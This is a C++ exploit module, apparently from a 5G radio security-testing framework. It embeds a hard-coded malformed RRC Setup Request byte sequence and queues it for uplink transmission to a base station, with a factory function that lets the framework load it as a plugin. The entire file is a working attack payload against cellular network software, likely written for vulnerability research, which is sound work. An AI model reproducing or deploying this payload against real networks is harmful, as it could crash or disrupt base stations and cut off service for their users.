// 341da9e1b9f1663d013f00
#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

uint8_t raw_rrc_setup_request[] = {0x34, 0x1d, 0xa9, 0xe1, 0xb9, 0xf1, 0x18, 0x3d, 0x1, 0x3f, 0x0};

class MalformedRRCSetupRequest : public Exploit
{
public:
  MalformedRRCSetupRequest(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                           SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    mal_rrc_setup_req.reset(
        new std::vector<uint8_t>(raw_rrc_setup_request, raw_rrc_setup_request + sizeof(raw_rrc_setup_request)));
  }

  void reset() override
  {
    /* Push the malformed RRC Setup Request during reset, so that it will pop when activated */
    ul_buffer_queue.push(mal_rrc_setup_req);
  };

  void setup() override {}

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
  }

private:
  std::shared_ptr<std::vector<uint8_t> > mal_rrc_setup_req;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MalformedRRCSetupRequest(dl_buffer_queue_, ul_buffer_queue_);
}
}